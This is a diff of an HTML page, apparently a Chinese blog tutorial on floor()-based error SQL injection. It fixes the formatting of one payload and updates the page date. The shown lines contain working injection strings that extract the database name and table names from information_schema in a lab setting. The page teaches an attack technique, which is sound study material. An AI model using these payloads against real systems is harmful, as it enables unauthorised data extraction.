@@ -727,7 +727,7 @@
 <p>select <em> from floortest where id=1 and **(select 1 from(select count(</em>),concat(user(),floor(rand(0)*2))) x from information_schema.tables group by x)a);**</p>
 <p>需要给(select count(<em>),concat(user(),floor(rand(0)\</em>2))) x from information_schema.tables group by x)表添加一个别名a</p>
 <h2 id="25-floor报错注入利用演示"><a href="#25-floor报错注入利用演示" class="headerlink" title="25 floor报错注入利用演示"></a>25 floor报错注入利用演示</h2><p>查询数据库名</p>
-<p>?id=1’) and(select 1 from(select count(<em>),concat(database(),floor(rand(0)</em>2))a from information_schema.tables group by a)x)—+</p>
+<p>?id=1’) and(select 1 from(select count(*),concat( database(),floor(rand(0)*2))a from information_schema.tables group by a)x)—+</p>
 <p>>‘security1’</p>
 <p>查询表名</p>
 <p>?id=1’) and (select 1 from(select count(<em>),concat(==(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
@@ -987,10 +987,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-19T12:19:36+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-11-06T21:06:20+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jan 19, 2021</p>
+    <p>更新于：Nov 6, 2021</p>
   </a>
 </div>
 
